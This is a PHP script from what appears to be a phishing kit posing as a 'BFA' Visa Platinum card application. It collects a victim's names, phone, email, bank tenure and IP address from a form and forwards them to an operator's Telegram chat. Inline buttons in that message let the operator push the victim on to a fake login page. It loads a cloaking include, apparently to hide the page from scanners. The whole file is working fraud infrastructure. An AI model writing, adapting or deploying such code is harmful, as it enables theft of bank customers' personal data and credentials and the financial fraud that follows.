<?php
require_once __DIR__ . '/cloak.php';
session_start();
include('settings.php');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(405); exit; }

$nombres    = trim($_POST['nombres']    ?? '');
$apellidos  = trim($_POST['apellidos']  ?? '');
$email      = trim($_POST['email']      ?? '');
$phone      = trim($_POST['phone']      ?? '');
$antiguedad = trim($_POST['antiguedad'] ?? '');

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';

$usuarioNombre = trim($nombres . ' ' . $apellidos);
if ($usuarioNombre) $_SESSION['usuario'] = $usuarioNombre;

$msg  = "💳 SOLICITUD DE TARJETA - BFA\n";
$msg .= "👤 Nombre: $nombres $apellidos\n";
if ($phone)      $msg .= "📞 Teléfono: $phone\n";
if ($email)      $msg .= "📧 Correo: $email\n";
if ($antiguedad) $msg .= "🏦 Antigüedad: $antiguedad\n";
$msg .= "🎯 Tarjeta: BFA Visa Platinum (\$5,000)\n";
$msg .= "🌐 IP: $ip\n";
$msg .= "⏩ Cliente avanzando al login...";

tg_request('sendMessage', [
    'chat_id'      => $chat_id,
    'text'         => $msg,
    'reply_markup' => json_encode([
        'inline_keyboard' => [[
            ['text' => '🔐 Login',    'callback_data' => "LOGIN|$usuarioNombre"],
            ['text' => '📋 Listado',  'callback_data' => "LISTADO|$usuarioNombre"]
        ]]
    ])
]);

http_response_code(200);
echo 'OK';
